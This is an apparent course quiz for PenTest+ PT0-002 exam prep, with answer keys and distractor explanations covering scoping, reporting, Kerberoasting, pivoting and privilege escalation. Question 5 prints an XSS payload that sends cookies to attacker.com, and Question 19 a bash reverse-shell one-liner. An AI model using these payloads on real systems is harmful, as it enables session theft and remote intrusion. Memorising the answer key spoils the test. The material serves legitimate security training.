# Quiz: Module 16 - Final Exam Prep & CompTIA PenTest+ PT0-002 Certification

## Course: CIS-4333_Penetration_Testing (CompTIA PenTest+)

---

**Question 1**
A penetration tester has completed all testing activities against a client's environment. Before submitting the final report, the tester removes all Meterpreter sessions, deletes uploaded tools, removes the backdoor user account created during privilege escalation testing, and provides the client a written statement confirming all artifacts have been cleared. What is the term for this final engagement phase, and why is it required?

* A) Scope validation — required to confirm that all systems tested were within the agreed Rules of Engagement boundary.
* B) Post-engagement cleanup and attestation — required to ensure all persistence mechanisms, shells, tools, and accounts placed during testing are removed so real attackers cannot leverage tester artifacts after the engagement ends.
* C) Risk acceptance documentation — required to record which findings the client has formally chosen not to remediate before the engagement closes.
* D) Vulnerability verification — required to confirm that all reported findings are genuine vulnerabilities and not false positives introduced by automated scanning tools.
* **Correct Answer:** B) Post-engagement cleanup and attestation — required to ensure all persistence mechanisms, shells, tools, and accounts placed during testing are removed so real attackers cannot leverage tester artifacts after the engagement ends.
* **Distractor Analysis:**
  * *Why B is correct:* Post-engagement cleanup is a mandatory final phase of every professional penetration test. Backdoors, shells, and created accounts are fully functional attack tools — if left in place, a real attacker who later accesses the same network could exploit them. Written attestation confirms the tester has fulfilled this obligation, protecting both the tester and the client legally. PT0-002 tests cleanup as an explicit phase, not an afterthought. This topic was covered in Module 15 (Reporting).
  * *Why A is incorrect:* Scope validation occurs at the beginning of the engagement during planning and scoping — not after testing activities have concluded. It confirms what is and is not authorized before any testing begins, not after.
  * *Why C is incorrect:* Risk acceptance documentation occurs when a client reviews findings and formally decides not to remediate a specific vulnerability. It is part of the reporting phase and is client-driven — it is not the same as cleanup attestation, which is tester-driven.
  * *Why D is incorrect:* Vulnerability verification (distinguishing true positives from false positives) is an analysis step that occurs during the vulnerability scanning and exploitation phases, well before reporting or cleanup. It is not the name or function of the post-engagement closing phase.

---

**Question 2**
Which of the following correctly states the PT0-002 exam domain weights, listed from largest to smallest?

* A) Planning & Scoping 30%, Information Gathering & Vulnerability Scanning 22%, Attacks & Exploits 18%, Reporting & Communication 16%, Tools & Code Analysis 14%.
* B) Attacks & Exploits 30%, Information Gathering & Vulnerability Scanning 22%, Reporting & Communication 18%, Tools & Code Analysis 16%, Planning & Scoping 14%.
* C) Information Gathering & Vulnerability Scanning 30%, Attacks & Exploits 22%, Tools & Code Analysis 18%, Reporting & Communication 16%, Planning & Scoping 14%.
* D) Attacks & Exploits 25%, Reporting & Communication 25%, Information Gathering & Vulnerability Scanning 20%, Planning & Scoping 15%, Tools & Code Analysis 15%.
* **Correct Answer:** B) Attacks & Exploits 30%, Information Gathering & Vulnerability Scanning 22%, Reporting & Communication 18%, Tools & Code Analysis 16%, Planning & Scoping 14%.
* **Distractor Analysis:**
  * *Why B is correct:* The five PT0-002 exam domains and their weights are: Attacks & Exploits (30%) — the largest domain covering exploitation, post-exploitation, privilege escalation, lateral movement, social engineering, wireless, web application, and cloud attacks; Information Gathering & Vulnerability Scanning (22%); Reporting & Communication (18%); Tools & Code Analysis (16%); Planning & Scoping (14%) — the smallest domain. Memorizing these weights helps candidates allocate study time proportionally and recognize which domain a scenario question belongs to.
  * *Why A is incorrect:* This option inverts the domain weights — assigning 30% to Planning & Scoping (the smallest domain) and only 14% to Attacks & Exploits (the largest). These are reversed and would lead to severe misallocation of study effort.
  * *Why C is incorrect:* This option inflates Information Gathering & Vulnerability Scanning to 30% and reduces Attacks & Exploits to 22%. While Information Gathering is the second-largest domain, it does not outweigh Attacks & Exploits. The ordering and weights in this option are incorrect.
  * *Why D is incorrect:* This option splits the top two domains evenly at 25% each, which does not reflect the actual PT0-002 weighting. Reporting & Communication is not tied for first at 25% — it is the third-largest domain at 18%. These figures are fabricated and do not match CompTIA's published exam objectives.

---

**Question 3**
A penetration tester is given a set of captured Kerberos TGS tickets from a Windows domain environment. The tester wants to crack the service account passwords offline. Which sequence of steps correctly describes the Kerberoasting attack and the appropriate tool to use?

* A) Use `aircrack-ng -w rockyou.txt` against the captured tickets — Kerberos tickets use WPA2-style PBKDF2 key derivation and require the same dictionary cracking approach as wireless handshakes.
* B) Run `sqlmap --dump` against the domain controller's LDAP port (389) to extract hashed service account passwords directly from Active Directory.
* C) Use `GetUserSPNs.py -request` from the Impacket suite to request TGS tickets for accounts with SPNs, then crack the RC4-encrypted tickets offline using `hashcat -m 13100` with a dictionary or rule-based attack.
* D) Use `hydra -l svc_account -P rockyou.txt ldap://dc.corp.local` to brute-force service account credentials directly against Active Directory's authentication interface.
* **Correct Answer:** C) Use `GetUserSPNs.py -request` from the Impacket suite to request TGS tickets for accounts with SPNs, then crack the RC4-encrypted tickets offline using `hashcat -m 13100` with a dictionary or rule-based attack.
* **Distractor Analysis:**
  * *Why C is correct:* Kerberoasting exploits the fact that any authenticated domain user can request TGS tickets for service accounts that have Service Principal Names (SPNs) registered. These tickets are encrypted with the service account's NTLM hash (RC4 encryption by default). `GetUserSPNs.py -request` from Impacket requests and captures these tickets. Hashcat mode `-m 13100` specifically handles Kerberos 5 TGS-REP etype 23 hashes — the format produced by Kerberoasting. The cracked password belongs to the service account, not to the requesting user. This is a purely offline attack — no authentication attempts are made against Active Directory during cracking.
  * *Why A is incorrect:* Kerberos TGS tickets are not WPA2 handshakes and are not cracked with `aircrack-ng`. Aircrack-ng is a wireless tool that cracks WPA2 PSK handshakes using PBKDF2-HMAC-SHA1. Kerberos tickets use RC4 or AES encryption and require a different cracking tool and hash mode entirely.
  * *Why B is incorrect:* `sqlmap` is a SQL injection tool designed for web application databases. It does not interact with LDAP, Active Directory, or Kerberos. There is no `--dump` functionality that extracts domain credentials from a domain controller's LDAP port.
  * *Why D is incorrect:* `hydra` performs online brute-force authentication attacks — it attempts live logins against a service. Online attacks against Active Directory risk triggering account lockout policies and generate significant authentication logs. Kerberoasting is specifically valuable because it is an offline attack that does not generate failed login events.

---

**Question 4**
On the PT0-002 exam, a performance-based question (PBQ) appears as the first question. The tester has spent 25 minutes on it and is still unsure of the answer. What is the recommended exam strategy?

* A) Continue working on the PBQ until it is answered correctly — PBQs are worth significantly more points than multiple-choice questions, and leaving them blank results in an automatic score penalty.
* B) Flag the PBQ and move on to the multiple-choice questions — PBQs often become clearer after answering related multiple-choice questions, and completing the easier questions first ensures maximum point accumulation before time runs out.
* C) Skip directly to the reporting domain questions first since Reporting & Communication (18%) has the highest point density relative to study time investment for most candidates.
* D) Request a test accommodation extension from the proctor — CompTIA allows candidates to pause the timer once per exam session for extended PBQ consideration.
* **Correct Answer:** B) Flag the PBQ and move on to the multiple-choice questions — PBQs often become clearer after answering related multiple-choice questions, and completing the easier questions first ensures maximum point accumulation before time runs out.
* **Distractor Analysis:**
  * *Why B is correct:* PT0-002 best practice is to flag difficult PBQs at the beginning and return to them after completing the multiple-choice section. PBQs appear at the start of the exam and can consume disproportionate time if the tester is unfamiliar with the simulated scenario. Multiple-choice questions that follow often reference the same concepts as the PBQ, and answering them can reinforce or clarify the correct approach. With 165 minutes and up to 85 questions, time management is critical — spending 40+ minutes on one PBQ while rushing through 80 multiple-choice questions is a high-risk strategy.
  * *Why A is incorrect:* CompTIA does not publish individual question point values, and PBQs are not confirmed to carry more weight than multiple-choice questions on PT0-002. There is no automatic penalty for flagging and returning to a question. Spending unlimited time on one question while depleting the time budget for the rest of the exam is a poor strategy regardless of perceived question weight.
  * *Why C is incorrect:* There is no exam interface feature to jump directly to questions by domain. Questions appear in the sequence set by the exam delivery system. Additionally, sorting questions by domain weighting to optimize study time is a study strategy — not a valid exam-day navigation strategy during a timed session.
  * *Why D is incorrect:* CompTIA does not allow candidates to pause the exam timer during a live testing session. Test accommodations (such as extended time) must be requested and approved before exam registration — they are not available as an in-session option requested from the proctor.

---

**Question 5**
A PT0-002 exam scenario describes a tester who has completed a web application assessment and discovered that the client's application reflects user input directly in HTTP responses without sanitization. The tester crafted the payload `<script>document.location='http://attacker.com/steal?c='+document.cookie;</script>` and confirmed it executes in the victim's browser when they visit a specific page. Which vulnerability type, CVSS severity characteristic, and PT0-002 domain does this finding primarily fall under?

* A) SQL Injection — Critical severity because it allows database extraction — Information Gathering & Vulnerability Scanning domain.
* B) Stored Cross-Site Scripting (XSS) — High severity if persistently stored, allowing session hijacking across all users — Attacks & Exploits domain.
* C) Reflected Cross-Site Scripting (XSS) — typically Medium to High severity — Attacks & Exploits domain (30%), with the finding documented in the Reporting & Communication domain (18%).
* D) Server-Side Request Forgery (SSRF) — Critical severity because it allows internal network access and IMDS credential theft — Tools & Code Analysis domain.
* **Correct Answer:** C) Reflected Cross-Site Scripting (XSS) — typically Medium to High severity — Attacks & Exploits domain (30%), with the finding documented in the Reporting & Communication domain (18%).
* **Distractor Analysis:**
  * *Why C is correct:* The scenario describes reflected XSS — unsanitized user input reflected directly in HTTP responses that executes in the victim's browser when they visit a specific crafted URL. The payload steals session cookies via `document.cookie`, enabling session hijacking. Reflected XSS typically scores Medium to High on CVSS v3.1 depending on the user interaction required (the victim must visit a crafted link). The attack technique is covered under the Attacks & Exploits domain (30%), and once confirmed, the finding must be documented — including CVSS score, affected URL, evidence, business impact (account takeover, credential theft), and remediation (output encoding, Content Security Policy) — in the Reporting & Communication domain (18%). PT0-002 expects candidates to link attack identification with reporting obligations.
  * *Why A is incorrect:* SQL Injection involves injecting SQL syntax into database queries — not injecting JavaScript into HTTP responses. The payload shown (`<script>`) is JavaScript, not SQL. SQL injection findings do not execute in the victim's browser; they manipulate database queries server-side.
  * *Why B is incorrect:* Stored XSS would require the malicious script to be saved persistently in the application's database and served to all users who load the affected page — without requiring a specially crafted URL. The scenario specifies the payload executes when the victim visits "a specific page" after receiving a crafted link, which is the defining characteristic of reflected XSS, not stored XSS. Stored XSS is generally considered higher severity because it does not require social engineering each victim individually.
  * *Why D is incorrect:* SSRF (Server-Side Request Forgery) forces the server itself to make HTTP requests to internal resources such as the IMDS at 169.254.169.254. The scenario describes client-side JavaScript execution in the victim's browser — not a server-side request. SSRF and XSS are distinct vulnerability classes with different attack surfaces, exploitation mechanisms, and remediation approaches.

---

### Question 6 (5 points)

A tester is reviewing a scope document before a web application engagement. The document lists the target as `app.corp.local`. During testing, the tester discovers that `app.corp.local` makes API calls to `api.corp.local`, which is not listed in the scope document. What is the correct action?

* A) Test `api.corp.local` immediately — it is functionally part of the same application
* B) Stop all interaction with `api.corp.local`, document the discovery, and notify the client to determine whether authorization can be extended to include it
* C) Test `api.corp.local` passively only, since passive observation of traffic does not constitute active testing
* D) Include `api.corp.local` findings in the report under a supplemental section labeled "Out-of-Scope Observations"

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: Functional integration does not imply authorization. Any system not explicitly listed in the RoE requires separate authorization before testing. The correct action is to pause, document, and escalate to the client — who may then amend the scope in writing to include the API endpoint.
  * Why A is incorrect: Being part of the application call chain is not equivalent to being in scope. Authorization must be explicit, not inferred from application architecture.
  * Why C is incorrect: Intentionally targeting any out-of-scope system — including passive traffic observation during an active engagement — requires authorization. The safest path is to stop and seek written authorization.
  * Why D is incorrect: Reporting findings from an unauthorized system as "out-of-scope observations" does not protect the tester legally. It still represents unauthorized testing and would expose the tester to liability.

---

### Question 7 (5 points)

A PT0-002 scenario presents the following Nmap output line: `21/tcp open ftp vsftpd 2.3.4`. Which of the following statements best describes the significance of this finding in a penetration test?

* A) vsftpd 2.3.4 is a fully patched current version and poses no risk — no further action is needed
* B) vsftpd 2.3.4 contains a backdoor introduced in a supply chain compromise; a tester should note the version, search for associated CVEs, and evaluate exploitation in the context of the authorized scope
* C) Port 21 open means the tester should immediately pivot to password spraying against the FTP service using Hydra
* D) The presence of FTP on port 21 is a Low-severity finding in all contexts because FTP is a legacy protocol with no active exploitation risk

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: vsftpd 2.3.4 is historically associated with a backdoor (CVE-2011-2523) introduced through a compromised source package. Identifying the version from banner information is a key step in vulnerability analysis. The tester notes it, researches associated CVEs, and evaluates it against the engagement scope — not automatically exploit it, but assess it as a confirmed vulnerability class.
  * Why A is incorrect: vsftpd 2.3.4 is not current and is specifically known for a historical backdoor vulnerability. Dismissing it as patched without verification would be a professionally deficient analysis.
  * Why C is incorrect: Moving immediately to credential brute-force without completing vulnerability analysis skips the structured methodology sequence. PT0-002 tests that testers follow the correct phase order — not that they jump to the first available attack vector.
  * Why D is incorrect: FTP severity depends on context — what data it exposes, whether anonymous login is enabled, and what version is running. Labeling all FTP findings as Low without analysis is inaccurate and demonstrates insufficient assessment rigor.

---

### Question 8 (5 points)

On the PT0-002 exam, which OWASP Top 10 category covers failures to properly restrict what authenticated users can access — such as horizontal privilege escalation where User A can view User B's account data by modifying a URL parameter?

* A) A02:2021 — Cryptographic Failures
* B) A01:2021 — Broken Access Control
* C) A03:2021 — Injection
* D) A07:2021 — Identification and Authentication Failures

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: Broken Access Control (A01:2021 — the top-ranked OWASP risk) covers failures to enforce restrictions on what authenticated users are permitted to do. This includes horizontal privilege escalation (accessing another user's data by changing an ID in a URL), vertical privilege escalation (accessing admin functions as a regular user), and insecure direct object references (IDOR). It moved to the number one position in the 2021 OWASP Top 10.
  * Why A is incorrect: Cryptographic Failures (A02:2021) covers weak encryption, cleartext transmission, and improper key management. Accessing another user's data via URL manipulation is an access control issue, not a cryptographic one.
  * Why C is incorrect: Injection (A03:2021) covers SQL injection, command injection, and similar input-handling flaws. Modifying a URL parameter to access another user's record is an access control bypass, not an injection attack — unless the parameter change exploits a SQL injection vulnerability, which is a separate and distinct finding.
  * Why D is incorrect: Identification and Authentication Failures (A07:2021) covers broken authentication mechanisms such as weak passwords, session fixation, and credential stuffing. Accessing another user's data through an IDOR vulnerability assumes authentication already succeeded — it is an authorization failure, not an authentication failure.

---

### Question 9 (5 points)

A penetration tester is preparing the executive summary of a final report. Which of the following correctly describes the audience and content of an executive summary?

* A) The executive summary is written for the technical team and includes full vulnerability details, CVSS scores, and exploitation commands used during testing
* B) The executive summary is written for senior leadership and non-technical stakeholders; it summarizes the overall risk posture, the most significant findings, and business impact in plain language — without technical exploitation details
* C) The executive summary replaces the technical findings section for smaller engagements where executives are also the technical decision-makers
* D) The executive summary is an optional component required only when findings exceed a Critical CVSS threshold

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: The executive summary is specifically written for a non-technical audience — CISOs, CFOs, CEOs, and board members who need to understand organizational risk without reading 50 pages of technical analysis. It describes the scope, overall risk rating, top findings in business terms, and strategic remediation priorities. Technical details belong in the findings section, not the executive summary.
  * Why A is incorrect: Full vulnerability details, CVSS scores, and exploitation specifics belong in the technical findings section of the report — not the executive summary. Presenting that content to executives without translation into business language defeats the purpose of the summary.
  * Why C is incorrect: The executive summary and technical findings section serve distinct audiences and purposes. Removing the technical section because executives are also technical practitioners would deprive the remediation team of the detailed guidance they need.
  * Why D is incorrect: An executive summary is a required component of every professional penetration test report, regardless of severity levels. Even an engagement with only low and medium findings needs an executive summary to communicate overall posture to leadership.

---

### Question 10 (5 points)

A PT0-002 scenario describes a Linux target where the tester has a low-privilege shell. The tester runs `find / -perm -4000 -type f 2>/dev/null` and identifies an unusual SUID binary at `/usr/local/bin/logparser`. What is the significance of a SUID bit on an executable, and why does an unusual SUID binary warrant investigation?

* A) The SUID bit causes the file to be deleted automatically on reboot — it indicates a temporary staging artifact from a prior engagement
* B) The SUID bit allows the binary to execute with the file owner's privileges (typically root) rather than the executing user's privileges — an unusual SUID binary may allow privilege escalation if it can be manipulated to execute arbitrary commands as root
* C) The SUID bit is a read-only flag indicating the file is part of the OS kernel and cannot be executed by regular users
* D) The SUID bit means the file is network-accessible and is listening on a local port — the `logparser` name suggests it is a log aggregation service

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: The Set User ID (SUID) bit on an executable causes it to run with the privileges of the file's owner — usually root — regardless of which user invokes it. This is a standard Unix privilege mechanism used by binaries like `passwd`. An unusual or custom SUID binary warrants investigation because if it can be manipulated to run arbitrary commands (through argument injection, PATH hijacking, or logic flaws), those commands execute as root — a direct privilege escalation path.
  * Why A is incorrect: The SUID bit has no relationship to boot-time file deletion. It is a persistent Unix permission bit that controls execution privilege context.
  * Why C is incorrect: The SUID bit does not restrict execution to kernel processes or prevent regular users from running the file. It is an elevation mechanism — the opposite of a restriction.
  * Why D is incorrect: The SUID bit has no relationship to network accessibility or port binding. Network services are controlled by the operating system's process and socket management, not by file permission bits.

---

### Question 11 (5 points)

Which of the following best describes the difference between a false positive and a false negative in the context of vulnerability scanning?

* A) A false positive is a vulnerability that exists only in test environments; a false negative is a vulnerability that exists only in production
* B) A false positive is a scanner report of a vulnerability that does not actually exist on the target; a false negative is a real vulnerability that the scanner fails to detect and does not report
* C) A false positive occurs when the CVSS score is overestimated; a false negative occurs when the CVSS score is underestimated
* D) A false positive is a finding that cannot be exploited; a false negative is a finding that can be exploited but is too complex for automated tools

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: These are fundamental assessment accuracy terms. A false positive creates unnecessary remediation work and erodes client trust in the assessment. A false negative is more dangerous — it means a real vulnerability goes undetected and unaddressed. PT0-002 expects candidates to understand both concepts and to validate automated scanner output through manual verification to reduce false positives and catch false negatives.
  * Why A is incorrect: False positives and false negatives are not defined by environment type. They refer to scanner accuracy — whether reported findings are real and whether real findings are reported — regardless of whether the system is a test or production environment.
  * Why C is incorrect: CVSS score accuracy is a separate concept from detection accuracy. A finding can have an accurate CVSS score and still be a false positive (the vulnerability the score was calculated for doesn't actually exist on the target). The terms false positive and false negative refer to detection, not scoring.
  * Why D is incorrect: Exploitability is not the defining criterion. A false positive is a reported finding that does not exist — regardless of whether it could theoretically be exploited. A false negative is an undetected real finding — regardless of complexity.

---

### Question 12 (5 points)

A PT0-002 exam question asks which tool is best suited for enumerating Active Directory users, groups, domain trusts, and attack paths in a Windows domain environment during a penetration test. Which answer is correct?

* A) Nessus — it performs authenticated Windows scans and enumerates AD objects via WMI
* B) BloodHound with the SharpHound collector — it maps AD relationships and attack paths including shortest paths to Domain Admin
* C) Nikto — it performs web server vulnerability scanning and can identify AD-integrated web applications
* D) theHarvester — it performs OSINT collection of email addresses and subdomains associated with the target domain

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: BloodHound is the purpose-built tool for Active Directory attack path analysis. The SharpHound collector gathers AD data (users, groups, GPOs, sessions, trusts, ACLs) and BloodHound visualizes the relationships as a graph, highlighting shortest attack paths to high-value targets such as Domain Admin. It is the standard tool for this specific use case and is explicitly referenced in PT0-002 tool objectives.
  * Why A is incorrect: Nessus can perform authenticated Windows scans and identify missing patches, but it is not designed for AD attack path mapping or visualizing relationships between AD objects. It is a vulnerability scanner, not an AD analysis tool.
  * Why C is incorrect: Nikto is a web server scanner focused on HTTP-level misconfigurations, outdated software, and web vulnerabilities. It has no Active Directory enumeration capability.
  * Why D is incorrect: theHarvester is an OSINT tool that collects publicly available information — email addresses, subdomains, IP ranges — from external sources. It operates in the passive reconnaissance phase and has no ability to enumerate internal Active Directory objects.

---

### Question 13 (5 points)

A penetration tester has shell access to a Windows system and wants to determine whether the current session is running with local administrator privileges. Which command produces the most direct answer?

* A) `ipconfig /all`
* B) `whoami /priv`
* C) `netstat -an`
* D) `systeminfo`

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: `whoami /priv` displays the privileges assigned to the current user's token, including whether SeDebugPrivilege, SeImpersonatePrivilege, and other elevated privileges are enabled. This is the direct method for confirming privilege level in a Windows shell session. An elevated session will show a broad set of enabled privileges including SeDebugPrivilege; a standard user session will show a limited set.
  * Why A is incorrect: `ipconfig /all` displays network interface configuration — IP addresses, MAC addresses, DNS servers. It provides no information about the current user's privilege level.
  * Why C is incorrect: `netstat -an` shows active TCP/UDP connections and listening ports. It is useful for network state analysis but provides no information about user privileges.
  * Why D is incorrect: `systeminfo` displays detailed OS and hardware information including patch level and domain membership. While useful for reconnaissance, it does not directly reveal the current session's privilege level.

---

### Question 14 (5 points)

When documenting a finding in a penetration test report, which of the following elements must be included to produce a professionally complete finding entry?

* A) Finding title, affected asset, severity rating, screenshot of the exploit, and the attacker's IP address used during testing
* B) Finding title, unique finding ID, affected asset(s), severity rating (CVSS score), description of the vulnerability, evidence (screenshots or output), business impact statement, and remediation recommendation
* C) Finding title, CVE number, and a link to the public exploit database entry for the vulnerability
* D) Finding title, CVSS score, and the specific Metasploit module path used to confirm exploitation

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: A complete finding entry gives the client everything they need to understand, prioritize, and remediate the vulnerability. The unique ID enables tracking across retests. The business impact statement connects the technical finding to organizational risk. The remediation recommendation tells the client what to do. Missing any of these elements degrades the report's usefulness and professionalism.
  * Why A is incorrect: The attacker's IP address used during testing is not a standard finding component. Including it adds no client value and could expose tester infrastructure. The core components are the vulnerability description, evidence, impact, and remediation — not the tester's operational details.
  * Why C is incorrect: Not all findings have CVE numbers — custom application logic flaws and configuration vulnerabilities typically do not. Relying on a CVE number and external link does not substitute for a findings section that explains the specific vulnerable instance in the client's environment.
  * Why D is incorrect: The specific exploitation tool used is an operational detail that can optionally appear in a technical appendix, but it is not a required finding component. Reports are tool-agnostic — the finding must stand on its own description regardless of how it was confirmed.

---

### Question 15 (5 points)

A PT0-002 scenario describes a tester who has compromised a Linux web server and wants to move laterally to a database server on an adjacent subnet (`10.10.20.0/24`) that is not directly reachable from the tester's attack machine. The compromised web server has two network interfaces. Which technique best describes using the compromised host to reach the internal subnet?

* A) Privilege escalation — gaining root on the web server automatically grants network access to all adjacent subnets
* B) Pivoting — configuring the compromised host as a network relay (using SSH port forwarding, a SOCKS proxy, or a Metasploit route) so that traffic from the attack machine is routed through the compromised host to the internal subnet
* C) Persistence — installing a scheduled task on the web server that beacons back to the attack machine whenever the database server is reachable
* D) Exfiltration — copying the web server's `/etc/hosts` file to the attack machine to discover the database server's hostname

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: Pivoting is the technique of using a compromised host as a relay to access network segments not directly reachable from the attack machine. Common methods include SSH local port forwarding, SSH dynamic forwarding with a SOCKS proxy, Metasploit's `route add` command, or tools like Chisel or SSHuttle. This is a core post-exploitation technique tested in PT0-002's Attacks & Exploits domain.
  * Why A is incorrect: Privilege escalation elevates the tester's access on the current host — it does not alter network routing or firewall rules. Root access on the web server does not automatically provide IP connectivity to adjacent subnets not already reachable from that host's network interfaces.
  * Why C is incorrect: Persistence maintains access to a compromised host over time — it does not enable lateral movement to an adjacent network. A beaconing scheduled task would contact the attack machine, not provide a path to the database subnet.
  * Why D is incorrect: Copying `/etc/hosts` may reveal hostnames, but hostname discovery is reconnaissance — not lateral movement. Knowing the database server's hostname does not establish network connectivity to it.

---

### Question 16 (5 points)

A penetration tester is reviewing the PT0-002 objectives and sees "Living off the Land (LotL)" listed under evasion techniques. Which of the following best describes a LotL approach?

* A) Using a custom-compiled malware payload with a unique hash to evade signature-based antivirus detection
* B) Using operating system built-in tools and trusted binaries — such as PowerShell, certutil, mshta, or wmic — to perform malicious actions, making detection harder because the tools are legitimate and expected in the environment
* C) Deploying a rootkit that hides attacker processes from the operating system's process list
* D) Encoding shellcode in Base64 before delivery to bypass perimeter email filtering

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: Living off the Land (LotL) is the technique of using tools and binaries already present on the target system — also called LOLBins (Living Off the Land Binaries) — to carry out attacker objectives. Because these are legitimate, digitally signed OS components, they are less likely to trigger signature-based AV or application whitelisting controls. Examples: using `certutil.exe` to download files, `mshta.exe` to execute scripts, or `PowerShell` for credential harvesting. PT0-002 explicitly covers LotL as an evasion technique.
  * Why A is incorrect: Custom-compiled payloads with unique hashes are a signature evasion technique, but they are not LotL. LotL specifically means leveraging existing trusted system binaries rather than introducing new executables.
  * Why C is incorrect: Rootkits that hide processes operate at the kernel level — they are a persistence and stealth technique separate from LotL. Rootkits typically require introducing new kernel modules or drivers, which is the opposite of using only pre-existing trusted binaries.
  * Why D is incorrect: Base64 encoding of shellcode is an obfuscation technique that may help evade simple pattern matching, but it is not LotL. LotL is defined by the use of legitimate system tools, not by encoding schemes applied to custom payloads.

---

### Question 17 (5 points)

A tester is asked to assess the security of a WPA2-Personal wireless network as part of an authorized engagement. The RoE explicitly authorizes wireless testing against the named SSID. Which sequence of steps correctly describes the authorized methodology for capturing a WPA2 4-way handshake for offline analysis?

* A) Connect to the wireless network, run Metasploit's `wifi_scanner` module, and extract the PSK from the module's output
* B) Place a wireless adapter into monitor mode, capture traffic on the target channel, optionally send a deauthentication frame to accelerate handshake capture, then crack the captured handshake hash offline using a dictionary attack
* C) Run Nmap with the `--script wifi-brute` option against the access point's management IP address to test PSK strength
* D) Use sqlmap against the access point's web management interface to extract the WPA2 PSK from the configuration database

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: The standard authorized WPA2 handshake capture methodology uses a wireless adapter in monitor mode to passively capture the 4-way authentication handshake. A deauthentication frame can be sent to a connected client to force reauthentication and capture the handshake more quickly. The captured handshake is then cracked offline using tools such as `aircrack-ng` or `hashcat` with a dictionary or rule-based attack. This entire process is offline after handshake capture — no live brute-force authentication attempts are made against the access point.
  * Why A is incorrect: Metasploit does not have a `wifi_scanner` module that extracts WPA2 PSKs from network traffic. This option describes a non-existent tool capability.
  * Why C is incorrect: Nmap does not have a `--script wifi-brute` script. Nmap operates at the network layer and does not interact with WPA2 authentication mechanisms. Wireless security testing requires specialized wireless tools, not Nmap.
  * Why D is incorrect: sqlmap is a SQL injection tool for web application databases. An access point's web management interface is a valid attack surface for web vulnerabilities, but extracting a WPA2 PSK via SQL injection is not the standard wireless assessment methodology described in PT0-002 objectives.

---

### Question 18 (5 points)

A penetration tester completes a full engagement and is preparing the final report. The client's compliance team asks whether the report satisfies the annual penetration testing requirement under PCI DSS. Which condition must be true for the report to satisfy PCI DSS Requirement 11.3?

* A) The test must have been performed exclusively by a QSA (Qualified Security Assessor) — internal testers do not satisfy Requirement 11.3
* B) The engagement must have included both external and internal testing of the cardholder data environment, and the methodology must meet PCI DSS penetration testing guidance standards
* C) The CVSS scores of all findings must average below 4.0 for the test to satisfy the requirement
* D) The test must have been performed using only Nessus and Qualys — PCI DSS Requirement 11.3 mandates specific approved scanning tools

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: PCI DSS Requirement 11.3 mandates annual penetration testing of the cardholder data environment (CDE) covering both external and internal perspectives, following industry-accepted penetration testing methodology. The tester must be organizationally independent and technically qualified, but is not required to be a QSA. The test must cover network and application layers of the CDE scope.
  * Why A is incorrect: PCI DSS Requirement 11.3 requires the tester to be organizationally independent and qualified, but does not mandate that they be a QSA. QSAs are required for formal PCI DSS assessment reports (ROC), not for penetration tests conducted under Requirement 11.3.
  * Why C is incorrect: PCI DSS Requirement 11.3 does not specify any CVSS average threshold. It requires that testing be performed and findings remediated — not that findings meet a particular severity distribution. An organization with critical findings must remediate them, not average them below a threshold.
  * Why D is incorrect: PCI DSS does not mandate specific scanning tools. Requirement 11.3 requires methodology alignment with accepted standards (such as PTES or NIST SP 800-115) but leaves tool selection to the qualified tester's professional judgment.

---

### Question 19 (5 points)

A tester reads the following bash one-liner in a script found on a compromised Linux host:

```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

What does this command do, and what PT0-002 domain is most relevant to analyzing it?

* A) It creates a compressed archive of all files in the current directory and transfers them to a remote FTP server — Information Gathering & Vulnerability Scanning domain
* B) It establishes an interactive reverse bash shell that redirects stdin, stdout, and stderr over a TCP connection to 192.168.1.100 on port 4444 — Tools & Code Analysis domain
* C) It performs a SYN port scan of the host at 192.168.1.100 and writes results to a file descriptor — Attacks & Exploits domain
* D) It sets a cron job that re-executes itself every minute to maintain persistence — Planning & Scoping domain

* **Correct Answer:** B
* **Distractor Analysis:**
  * Why B is correct: This is a standard bash TCP reverse shell one-liner. `bash -i` starts an interactive bash shell. `>& /dev/tcp/192.168.1.100/4444` redirects stdout and stderr to a TCP connection opened to 192.168.1.100 on port 4444 using bash's built-in `/dev/tcp` pseudo-device. `0>&1` redirects stdin from the same socket, creating a fully interactive bidirectional shell. Reading and interpreting scripts like this is tested in PT0-002's Tools & Code Analysis domain (16%).
  * Why A is incorrect: This command creates a TCP network connection to a remote host — not a compressed archive transfer. There is no compression, file enumeration, or FTP protocol involvement in this command.
  * Why C is incorrect: This is not a port scanner. It opens a single TCP connection to a specific host and port, not a scan across multiple ports or hosts. SYN scans are performed by tools like Nmap, not by bash TCP redirection.
  * Why D is incorrect: This command does not interact with cron, crontab, or any scheduling mechanism. It executes a single network connection and shell redirect. Persistence via cron would require a `crontab -e` or file write to `/etc/cron.d`.

---

### Question 20 (5 points)

A penetration tester has completed all five phases of an engagement: planning, reconnaissance, vulnerability scanning, exploitation, and post-exploitation. They are now writing the final report. Which of the following items belongs in the remediation recommendations section — not the findings section — of the report?

* A) The CVSS base score and vector string for each vulnerability
* B) Screenshots demonstrating successful exploitation of the identified vulnerability
* C) Specific, actionable guidance for the client's engineering team describing how to fix the vulnerability — such as "apply parameterized queries to all database calls in the authentication module" rather than "fix the SQL injection"
* D) The affected asset's hostname, IP address, and operating system version

* **Correct Answer:** C
* **Distractor Analysis:**
  * Why C is correct: The remediation recommendations section provides the client's engineering and operations teams with specific, actionable guidance for addressing each finding. Effective recommendations name the specific fix, reference the affected component, and often cite vendor documentation or security standards. Vague guidance such as "fix the SQL injection" forces the client to research the remedy on their own — high-quality reports provide enough specificity to act on immediately.
  * Why A is incorrect: CVSS base scores and vector strings are metadata that belongs in the findings section, alongside the finding description and evidence. They quantify severity for prioritization, not remediation guidance.
  * Why B is incorrect: Exploitation screenshots are evidence that belongs in the findings section to prove the vulnerability is real and exploitable. They document what happened — not what the client should do about it.
